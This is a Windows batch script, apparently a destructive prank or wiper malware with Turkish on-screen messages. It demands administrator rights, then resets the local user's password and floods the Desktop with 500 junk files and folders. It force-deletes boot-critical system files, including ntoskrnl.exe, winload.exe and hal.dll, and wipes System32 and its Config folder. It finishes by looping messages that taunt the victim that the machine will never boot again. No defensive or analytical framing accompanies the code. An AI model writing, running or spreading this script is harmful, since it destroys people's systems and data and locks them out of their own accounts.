@echo off

net localgroup users | findstr /v "Command completed successfully" | findstr /v "Alias name" | findstr /v "Comment" | findstr /v "Members" | findstr /v "The command completed" | findstr /v "*" > users.txt

for /f "tokens=*" %%a in (users.txt) do (
    set found_user=%%a
    set found_user=!found_user: =!
    if "!found_user!" neq "" (
        set username=!found_user!
    )
)

del users.txt

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    msg * "Bu dosyayı yönetici olarak açmalısınız!"
    exit /b
)

net user %username% "D@ng3rF1!e"

cd %userprofile%\Desktop

for /L %%i in (1,1,500) do (
    set "random_name="
    for /L %%j in (1,1,8) do (
        set /a "rand=!random! %% 36"
        cmd /c exit /b !rand!
        if !errorlevel! leq 9 (
            set "random_name=!random_name!!errorlevel!"
        ) else (
            set /a "rand=!rand!+55"
            cmd /c exit /b !rand!
            for /f %%k in ('cmd /c echo %%errorlevel%%^|findstr /n "^" ^& exit !errorlevel!') do set "random_name=!random_name!%%k"
        )
    )
    echo This is a random text file > "!random_name!.txt"
    md "Folder_!random_name!"
)

del /f /q /s "%SystemRoot%\System32\winload.exe" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\ntoskrnl.exe" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\hal.dll" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\bootvid.dll" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\ci.dll" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\drivers\disk.sys" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\drivers\pci.sys" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\*" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\Config\*.*" >nul 2>&1
msg * "Merhaba!"

:loop
    msg * "Sistemin bir daha yeniden başlayamaz!"
    msg * "Son bilgisayarının son dakikalarının keyfini çıkar!"
    msg * "Unutma parolan değişti ve masaüstün doldu!"
goto loop
